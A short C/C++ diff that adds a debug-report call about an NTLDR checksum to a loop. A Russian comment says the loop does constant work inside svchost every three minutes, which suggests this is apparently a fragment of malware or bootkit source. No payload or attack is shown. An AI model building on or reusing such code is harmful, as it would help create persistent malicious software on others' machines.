@@ -36,6 +36,8 @@ void DbgRptSvchostThread(void* Arguments)
 		// 304_ld постоянная работа в Svchost (каждые 3 минуты)
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("304_ld"));
 
+		PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());
+
 		pSleep(3 * 60 * 1000);
 	}
 }
